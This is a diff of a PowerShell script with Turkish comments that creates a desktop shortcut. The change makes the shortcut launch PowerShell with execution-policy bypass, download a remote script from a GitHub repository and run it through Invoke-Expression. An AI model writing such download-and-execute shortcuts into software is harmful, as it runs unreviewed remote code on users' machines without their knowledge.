@@ -12,8 +12,9 @@ $shell = New-Object -ComObject WScript.Shell
 
 # Kısayolu oluşturun
 $shortcut = $shell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = "C:\Windows\System32\cmd.exe"  # Kısayolun hedef yolu
-$shortcut.Arguments = "/c echo Hello World"  # Kısayolun argümanları (bu kısmı ihtiyacınıza göre değiştirin)
+$shortcut.TargetPath = "PowerShell.exe"
+$shortcut.Arguments = "-ExecutionPolicy Bypass -Command `"& { Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/SirriusV1/Oyun-Cfg/main/updated/main.ps1' | Invoke-Expression }`""
+$shortcut.WorkingDirectory = $desktopPath  # Çalışma dizini, kısayolu masaüstünde oluşturur
 $shortcut.Save()
 
 # Favicon.ico'yu GitHub'dan indirin
@@ -26,7 +27,6 @@ $shortcut.Save()
 # Simge dosyasını 800 ms bekleyip silin
 Start-Sleep -Milliseconds 800
 Remove-Item -Path $iconPath
-
 
 
 
